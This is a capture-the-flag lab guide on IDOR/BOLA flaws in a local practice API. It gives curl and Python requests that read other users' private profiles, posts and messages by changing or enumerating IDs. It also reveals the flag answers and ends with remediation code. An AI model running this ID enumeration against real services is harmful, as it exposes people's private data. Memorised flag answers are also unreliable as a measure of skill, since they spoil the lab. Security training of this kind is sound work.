# Lab 03: Broken Object Level Authorization (BOLA/IDOR)

## Overview

| Field          | Details                                              |
|----------------|------------------------------------------------------|
| **Objective**  | Access unauthorized data through IDOR vulnerabilities |
| **Difficulty** | ⭐⭐ Easy-Medium                                     |
| **Time**       | 60 minutes                                           |
| **Category**   | Authorization / IDOR                                  |
| **OWASP**      | API1:2023 - Broken Object Level Authorization         |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5000`
- `curl` or an HTTP client
- Python 3 with the `requests` library installed
- Completion of Labs 01–02 (recommended)

---

## Background

**Broken Object Level Authorization (BOLA)**, also known as **Insecure Direct Object Reference (IDOR)**, is the #1 vulnerability in the OWASP API Security Top 10. It occurs when an API exposes endpoints that handle object identifiers (such as user IDs, message IDs, or post IDs) without verifying that the authenticated user has permission to access those specific objects.

**How it works:**
1. A user logs in and receives a token
2. The user requests their own data: `GET /api/v1/users/1` (their ID is 1)
3. The user changes the ID: `GET /api/v1/users/3` (someone else's ID)
4. If the API returns the other user's data without checking authorization → **BOLA vulnerability**

In this lab, you'll log in as Alice (a regular user) and attempt to access Charlie's private profile, private posts, and private messages.

---

## Tasks

### Task 1: Login as Alice

Authenticate as Alice to get a valid JWT token.

**Steps:**
1. Send a POST request to `/api/v1/auth/login`
2. Use credentials: `alice` / `password123`
3. Save the returned JWT token for subsequent requests

**curl example:**
```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "Token: $TOKEN"
```

**Python example:**
```python
import requests

BASE = "http://localhost:5000"

r = requests.post(f"{BASE}/api/v1/auth/login",
    json={"username": "alice", "password": "password123"})
token = r.json()["token"]
headers = {"Authorization": f"Bearer {token}"}
print(f"Logged in as alice. Token: {token[:20]}...")
```

<details>
<summary>💡 Hint 1</summary>
Alice's user ID is 1. Her token should work for all authenticated endpoints.
</details>

<details>
<summary>💡 Hint 2</summary>
You can decode the JWT token (it uses a weak secret) to see Alice's user ID and role.
</details>

<details>
<summary>💡 Hint 3</summary>
The login response returns a JSON object with a "token" field containing the JWT.
</details>

---

### Task 2: Access Charlie's Private Profile

Charlie (id=3) has a private account. Try to access his full profile using Alice's token.

**Steps:**
1. First, access your own profile: `GET /api/v1/users/1`
2. Now try Charlie's profile: `GET /api/v1/users/3`
3. Note Charlie's private/secret email address
4. Compare what you see vs. what a private profile should expose

**🚩 FLAG 1: What is Charlie's secret email address?**

**curl example:**
```bash
# Your own profile
curl -s http://localhost:5000/api/v1/users/1 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Charlie's private profile
curl -s http://localhost:5000/api/v1/users/3 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

<details>
<summary>💡 Hint 1</summary>
Simply change the user ID in the URL from 1 to 3. If the API doesn't check ownership, you'll see Charlie's data.
</details>

<details>
<summary>💡 Hint 2</summary>
Look at the "email" field in Charlie's profile response. Private profiles should hide this information.
</details>

<details>
<summary>💡 Hint 3</summary>
Charlie's secret email is: <code>charlie_secret@socialhack.local</code>. The API returns his full profile even though his account is private and you are logged in as Alice.
</details>

---

### Task 3: Read Charlie's Private Posts

Charlie has private posts that contain business-sensitive information. Try to access them.

**Steps:**
1. Try to access post IDs 5 and 6: `GET /api/v1/posts/5` and `GET /api/v1/posts/6`
2. Look for financial or business-sensitive data in the post content
3. Note the Q4 loss amount mentioned in one of the posts

**🚩 FLAG 2: What is the Q4 loss amount from Charlie's private post?**

**curl example:**
```bash
# Read Charlie's private posts
curl -s http://localhost:5000/api/v1/posts/5 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

curl -s http://localhost:5000/api/v1/posts/6 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Python example:**
```python
for post_id in [5, 6]:
    r = requests.get(f"{BASE}/api/v1/posts/{post_id}", headers=headers)
    post = r.json()
    print(f"Post {post_id}: {post.get('content', 'N/A')[:100]}...")
```

<details>
<summary>💡 Hint 1</summary>
Even private posts can be accessed by their ID if the API doesn't check authorization.
</details>

<details>
<summary>💡 Hint 2</summary>
Look in the post content for financial figures, dollar amounts, or phrases like "Q4 loss".
</details>

<details>
<summary>💡 Hint 3</summary>
The Q4 loss amount is: <code>$2.3M</code>. Found in one of Charlie's private posts about quarterly financial results.
</details>

---

### Task 4: Read Private Messages

Try to read private messages between other users by guessing message IDs.

**Steps:**
1. Try to access messages with IDs 4 and 5: `GET /api/v1/messages/4` and `GET /api/v1/messages/5`
   - These are messages between Charlie and Admin
2. Try message IDs 8 and 9: `GET /api/v1/messages/8` and `GET /api/v1/messages/9`
   - These are messages between Admin and Bob
3. Look for a temporary admin password in the admin-to-bob messages

**🚩 FLAG 3: What is the temporary admin password from admin's message to bob?**

**curl example:**
```bash
# Messages between Charlie and Admin
curl -s http://localhost:5000/api/v1/messages/4 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

curl -s http://localhost:5000/api/v1/messages/5 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Messages between Admin and Bob
curl -s http://localhost:5000/api/v1/messages/8 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

curl -s http://localhost:5000/api/v1/messages/9 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Python example:**
```python
# Enumerate messages
for msg_id in range(1, 15):
    r = requests.get(f"{BASE}/api/v1/messages/{msg_id}", headers=headers)
    if r.status_code == 200:
        msg = r.json()
        print(f"Message {msg_id}: from={msg.get('sender_id')} to={msg.get('receiver_id')}")
        print(f"  Content: {msg.get('content', 'N/A')[:100]}")
        print()
```

<details>
<summary>💡 Hint 1</summary>
Messages use sequential integer IDs. Try iterating through IDs 1–15 to find all messages.
</details>

<details>
<summary>💡 Hint 2</summary>
Look for a message from the admin (id=4) to bob (id=2) that contains a temporary password.
</details>

<details>
<summary>💡 Hint 3</summary>
The temporary admin password is: <code>TempAdmin@2024</code>. Found in a message from admin to bob sharing temporary credentials.
</details>

---

## Flags to Find

| Flag   | Description                                  | Hint                                |
|--------|----------------------------------------------|-------------------------------------|
| FLAG 1 | Charlie's secret email address               | IDOR on user profile endpoint       |
| FLAG 2 | Q4 loss amount from Charlie's private post   | IDOR on posts endpoint              |
| FLAG 3 | Temp admin password from admin-bob messages  | IDOR on messages endpoint           |

---

## Remediation

### 1. Implement Object-Level Authorization Checks
```python
@app.route("/api/v1/users/<int:user_id>")
@jwt_required()
def get_user(user_id):
    current_user_id = get_jwt_identity()
    user = User.query.get_or_404(user_id)

    # Allow access only to own profile or public profiles
    if user.is_private and user.id != current_user_id:
        return jsonify({"error": "Access denied"}), 403

    return jsonify(user.to_public_dict())
```

### 2. Check Message Ownership
```python
@app.route("/api/v1/messages/<int:message_id>")
@jwt_required()
def get_message(message_id):
    current_user_id = get_jwt_identity()
    message = Message.query.get_or_404(message_id)

    # Only sender or receiver can read the message
    if message.sender_id != current_user_id and message.receiver_id != current_user_id:
        return jsonify({"error": "Access denied"}), 403

    return jsonify(message.to_dict())
```

### 3. Use UUIDs Instead of Sequential IDs
```python
import uuid

class User(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    # UUIDs make enumeration much harder (but don't replace proper authz checks!)
```

### 4. Implement Authorization Middleware
```python
def authorize_resource(resource_type):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            resource = get_resource(resource_type, kwargs.get("id"))
            if not current_user_can_access(resource):
                abort(403)
            return f(*args, **kwargs)
        return wrapper
    return decorator
```

### 5. OWASP Recommendations
- **API1:2023**: Implement authorization checks at the object level for every function that accesses a data source using an input from the user.

---

## References

- [OWASP API Security Top 10 - API1:2023](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [PortSwigger: Insecure Direct Object References](https://portswigger.net/web-security/access-control/idor)
